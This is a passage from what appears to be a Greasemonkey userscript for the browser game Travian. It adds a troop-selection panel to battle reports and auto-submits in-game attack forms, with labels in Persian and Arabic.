	_btn.name=n;
	_btn.value=' - ';
	_btn.style.margin='0 10px';
	_btn.addEventListener('click',function(){
		var tn = GM_getValue('tedade_niroo_'+suffixGlobal,''),ntn='';
		tn = tn.split("|");
		for(var i=0,n=tn.length; i<n; i++){
			if(tn[i]!=this.name)
				ntn+=tn[i]+'|';
		}
		ntn=ntn.substr(0,ntn.length-1);
		GM_setValue('tedade_niroo_'+suffixGlobal,ntn);
		this.parentNode.parentNode.removeChild(this.parentNode);
	},false);
	_rowDiv.appendChild(_btn);
	return _rowDiv;
}
(function(){
	if(run_once)return;run_once=1;
	var $=jQuery;
	if(document.URL.search('.{2,}travian.{3,}/berichte.php.{1,}id')!=-1){
		try{$('.units:first img').each(function(i,e){sarbazan.push(e.alt);});}catch(E){return;}
		if($('.units:first img:first').hasClass('u1')) nejad = 'room';
		else if($('.units:first img:first').hasClass('u11')) nejad = 'tootan';
		else nejad = 'gool';

		var _href=false,eAll = document.createElement('DIV'),e = document.createElement('DIV'), addnew = createElem('INPUT'),btn = createElem('INPUT');
		jQuery('.defender  a').each(function(){ 
			if(this.href.indexOf('karte')!=-1 && getParams('c',this.href)!=null && getParams('d',this.href)!=null){
				_href=this.href;
			}
		});
		if(!_href)return false;
		e.appendChild(getNewSarbazRow(1));
		addnew.type='button';
		addnew.value = ' + ';
		addnew.addEventListener('click',function(){e.appendChild(getNewSarbazRow());},false);
		btn.type='button';
		btn.value = ' هجوووم ';
		btn.addEventListener('click',function(){
			var tedad_s='',sarbaz_s='',tedad=document.getElementsByName('attackNum'),sarbaz=document.getElementsByName('attackSol'),noe=document.getElementById('attackType');
			for(var i=0,n=tedad.length;i<n;i++){
				tedad_s += tedad[i].options[tedad[i].options.selectedIndex].value +'.';
				sarbaz_s+= sarbaz[i].options[sarbaz[i].options.selectedIndex].value + '.';
			}
			tedad_s=tedad_s.substr(0,tedad_s.length-1);
			sarbaz_s=sarbaz_s.substr(0,sarbaz_s.length-1);
			
			noe=noe.options[noe.options.selectedIndex].value;
			document.location="a2b.php?z="+(_href.split("?d=")[1])+'&ts_level=3&ts_info='+tedad_s+'|'+noe+'|'+sarbaz_s;
			return;
		},false);
		eAll.appendChild(e);
		eAll.appendChild(btn);
		eAll.appendChild(addnew);
		var _c={'width': '100%','text-align':'center','line-height': '1px'};
		$(e).css(_c);$(eAll).css(_c);
		jQuery('.report_content')[0].appendChild(eAll);
		
		
		
		//setting code
		var eDev=createElem('DIV'),hr=document.createElement('HR'),anc=createElem('A'),pb = document.getElementById("ce");
		if (pb == null)return;
		anc.href='#'; anc.innerHTML='<B> خيارات عدد الجنود </b>';
		anc.addEventListener('click',function(){
			var popDiv=document.createElement('DIV'),
				sc='<a href="#" onClick="(function(){ document.getElementById(\'ce\').innerHTML=\'\'; location.reload(); return false;})();"><img src="img/x.gif" border="1" class="popup4" alt="Move"></a><div id="drag">',
				tedade_niroo = GM_getValue('tedade_niroo_'+suffixGlobal,''),
				_addNew=document.createElement('INPUT');
				
			$(popDiv).addClass('popup3');
			sc+= '<B>نخيارات عدد الجنود</b><BR>';
			popDiv.innerHTML=sc;
			_addNew.type='button';
			_addNew.value = ' ااضافة اعداد المرغوب الهجوم بهم  ';
			popDiv.appendChild(_addNew);
			
			_addNew.addEventListener('click',function(){
				var new_tedad = parseInt(prompt("اااضافة اعداد المرغوب الهجوم بهم"));
				if(isNaN(new_tedad)) return false;
				_tedade_niroo='|'+tedade_niroo+'|';
				if(_tedade_niroo.indexOf('|'+new_tedad+'|')!==-1 || _tedade_niroo.indexOf(new_tedad+'|')==0 || _tedade_niroo.indexOf('|'+new_tedad)==_tedade_niroo.lastIndexOf('|')){
					alert('این تعداد قبلا اضافه شده است!');
					return false;
				}
				tedade_niroo+='|'+new_tedad;
				if(tedade_niroo[0]=='|')tedade_niroo=tedade_niroo.substr(1,tedade_niroo.length);
				GM_setValue('tedade_niroo_'+suffixGlobal, tedade_niroo);
				popDiv.appendChild(stg_addRow(new_tedad));
			},false);
			
			if(tedade_niroo!=''){
				pCount=tedade_niroo.split('|');
				for(var i=0,n=pCount.length; i<n; i++){
					popDiv.appendChild(stg_addRow(pCount[i]));
				}
			}
			pb.appendChild(popDiv);
			return false;
		},false);
		eDev.appendChild(br());
		eDev.appendChild(hr);
		eDev.appendChild(anc)
		$("#side_info")[0].appendChild(eDev);
	}
	
	if(level()==2){
		var _href=false;
		jQuery('#options a').each(function(i){ 
			if(this.href.indexOf('a2b')!=-1 && getParams('z',this.href)!=null){
				_href=this.href;
			}
		});
		if(!_href)return;
		document.location = _href+getParams('');
	}
	if(level()==3){
		var ts_info=getParams('ts_info').split('|');noe=parseInt(ts_info[1])+2;
		var tedad = ts_info[0].split('.'), sarbaz = ts_info[2].split('.');
		for(i=0,n=tedad.length; i<n; i++){
			jQuery("input[name=t"+sarbaz[i]+"]").val(tedad[i]);
		}
		jQuery("input[name=c][value="+noe+"]").attr('checked','checked');
		var frm = jQuery("form[name=snd]");
		frm.attr('action',frm[0].action+'?&ts_level=4');
		frm.submit();
	}
	if(level()==4){
		jQuery('#short_info').parent().submit();
	}
})();